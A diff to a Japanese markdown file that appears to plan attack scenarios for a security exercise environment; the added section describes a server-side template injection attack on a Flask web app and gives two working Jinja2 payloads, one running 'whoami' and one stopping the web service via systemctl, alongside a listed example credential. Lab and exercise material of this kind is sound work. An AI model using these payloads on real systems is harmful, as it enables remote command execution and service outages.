@@ -74,6 +74,21 @@ WEBサーバーよりクレデンシャル情報が流出する
 - `dev`ユーザーが侵害される（`dev`/`devpass123`）
 - 不正なファイルが`/var/www/html/hacked`作成される
 
+## WEBアプリへの攻撃
+
+SSTIでWEBアプリへの攻撃を行う
+
+- WEBサーバーに攻撃が来る
+- SSTIでUFWのルールが追加される
+
+```
+{{request.application.__globals__.__builtins__.__import__('os').popen('whoami').read()}}
+```
+
+```
+{{request.application.__globals__.__builtins__.__import__(%27os%27).popen(%27systemctl%20stop%20http-flask.service%27).read()}}
+```
+
 # todo 
 
 - すべてのシステムでuser.shを実行する
